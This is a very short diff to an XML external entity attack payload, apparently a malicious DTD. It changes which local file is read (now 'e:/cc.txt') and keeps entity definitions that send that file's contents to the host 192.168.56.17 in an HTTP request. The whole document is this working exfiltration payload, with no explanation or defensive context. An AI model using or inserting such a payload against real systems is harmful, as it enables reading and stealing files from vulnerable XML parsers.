@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///c:/poc.rb">
+<!ENTITY % file SYSTEM "file:///e:/cc.txt">
         <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://192.168.56.17/%file;'>">
         %eval;
         %exfiltrate;
